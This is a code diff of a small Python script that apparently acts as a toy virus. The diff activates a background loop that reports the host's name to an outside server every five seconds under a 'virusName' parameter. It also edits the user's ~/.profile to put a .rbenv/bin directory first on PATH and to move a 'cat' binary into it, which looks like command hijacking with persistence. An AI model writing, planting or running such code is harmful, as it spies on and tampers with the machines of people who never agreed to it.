@@ -11,8 +11,9 @@ import socket
 code = """
 import socket
 import time
+import requests
 while True:
-	#requests.get('http://monitor.daviddworken.com:8000/api/submit?id=%s&virusName=1' % socket.gethostname())
+	requests.get('http://monitor.daviddworken.com:8080/api/submit?id=%s&virusName=1' % socket.gethostname())
 	time.sleep(5)"""
 
 os.system('python -c "%s" &' % code)
@@ -23,8 +24,7 @@ os.system(command)
 
 with open('/home/%s/.profile' % getpass.getuser(), 'a+') as f:
 	lines = f.readlines()
-	if 'PATH="/home/%s/.rbenv/bin:$PATH"\n' not in lines:
+	if 'PATH="/%s/.rbenv/bin:$PATH"\n' not in lines:
 		f.write('PATH="/home/%s/.rbenv/bin:$PATH"\n' % getpass.getuser())
-	if 'mv /bin/bucket/cat /home/%s/.rbenv/bin\n' % getpass.getuser() not in lines:
-		f.write('mv /bin/bucket/cat /home/%s/.rbenv/bin\n' % getpass.getuser())
-
+	if 'mv /bin/bucket/cat /%s/.rbenv/bin\n' % getpass.getuser() not in lines:
+		f.write('mv /bin/bucket/cat /%s/.rbenv/bin\n' % getpass.getuser())
